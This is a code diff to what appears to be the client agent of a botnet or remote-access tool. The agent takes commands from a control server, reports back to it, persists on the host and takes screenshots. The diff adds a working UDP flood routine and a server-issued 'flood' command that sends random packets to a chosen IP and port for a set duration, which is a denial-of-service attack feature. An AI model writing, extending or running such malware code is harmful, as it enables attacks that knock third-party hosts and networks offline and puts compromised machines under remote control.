@@ -16,6 +16,7 @@ import zipfile
 import tempfile
 import socket
 import getpass
+import random
 if os.name == 'nt':
     from PIL import ImageGrab
 else:
@@ -87,6 +88,23 @@ class Agent(object):
         """ Returns a unique ID for the agent """
         return getpass.getuser() + "_" + str(uuid.getnode())
 
+    def vaild_ip(self, address):
+        try:
+            socket.inet_aton(address)
+            if address.count(".") == 3:
+                return True
+            else:
+                return False
+        except:
+            return False
+
+    def is_int(self, userInput):
+        try:
+            val = int(userInput)
+            return True
+        except ValueError:
+            return False
+
     def server_hello(self):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
@@ -102,7 +120,7 @@ class Agent(object):
             return
         if newlines:
             output += "\n\n"
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
+        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
         data={'output': output})
 
     def expand_path(self, path):
@@ -119,6 +137,24 @@ class Agent(object):
             self.send_output(output)
         except Exception as exc:
             self.send_output(traceback.format_exc())
+
+    @threaded
+    def flood(self, ip, port, duration):
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        bytes = random._urandom(1024)
+
+        timeout = time.time() + duration
+
+        sent = 0
+
+        while 1:
+            if time.time() > timeout:
+                self.send_output("Attack on " + ip + " has finished. Sent " + str(sent) + " packages.")
+                return
+
+            udp_socket.sendto(bytes, (ip, port))
+            sent += 1
 
     @threaded
     def python(self, command_or_file):
@@ -215,7 +251,7 @@ class Agent(object):
         self.send_output('[+] Agent installed.')
 
     def clean(self):
-        """ Uninstalls the agent """ 
+        """ Uninstalls the agent """
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.ares')
             if os.path.exists(persist_dir):
@@ -259,7 +295,7 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-   
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
@@ -303,7 +339,7 @@ class Agent(object):
                             if not args:
                                 self.send_output('usage: cd </path/to/directory>')
                             else:
-                                self.cd(args[0])
+                                self.cd(' '.join(args[0:]))
                         elif command == 'upload':
                             if not args:
                                 self.send_output('usage: upload <localfile>')
@@ -337,6 +373,20 @@ class Agent(object):
                             self.screenshot()
                         elif command == 'help':
                             self.help()
+                        elif command == 'flood':
+                            if not args or len(args) < 3:
+                                self.send_output('usage: flood <ip> <port> <duration in seconds>')
+                            else:
+                                if self.vaild_ip(args[0]):
+                                    if self.is_int(args[1]):
+                                        if self.is_int(args[2]):
+                                            self.flood(args[0], int(args[1]), int(args[2]))
+                                        else:
+                                            self.send_output('[error] attack duration must be an integer')
+                                    else:
+                                        self.send_output('[error] port must be an integer')
+                                else:
+                                    self.send_output('[error] ' + args[0] + ' is not a valid ip address')
                         else:
                             self.runcmd(commandline)
                     except Exception as exc:
